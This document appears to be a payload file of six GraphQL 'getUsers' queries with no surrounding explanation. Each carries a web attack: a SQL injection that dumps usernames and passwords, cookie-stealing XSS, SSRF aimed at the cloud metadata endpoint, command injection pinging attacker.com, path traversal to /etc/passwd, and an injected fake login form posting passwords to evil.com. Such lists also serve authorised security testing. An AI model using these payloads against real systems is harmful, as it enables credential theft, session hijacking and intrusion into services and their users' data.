query getUsers {
  getUsers(filter: "1' UNION SELECT NULL,CONCAT(username,':',password) FROM users--") {
    id
    firstName
  }
}

query getUsers {
  getUsers(search: "<img src=x onerror=alert(document.cookie)>") {
    id
    description
  }
}

query getUsers {
  getUsers {
    wallets {
      transactions {
        location(name: "http://169.254.169.254/latest/meta-data") {
          lat
          lng
        }
      }
    }
  }
}

query getUsers {
  getUsers(filter: "'; ping -c 5 attacker.com || '") {
    id
    firstName
  }
}

query getUsers {
  getUsers {
    wallets {
      transactions(description: "../../../etc/passwd") {
        amount
        description
      }
    }
  }
}

query getUsers {
  getUsers(search: "<h1>Free Crypto!</h1><form action='http://evil.com'>Password:<input type='password'></form>") {
    id
    description
  }
}

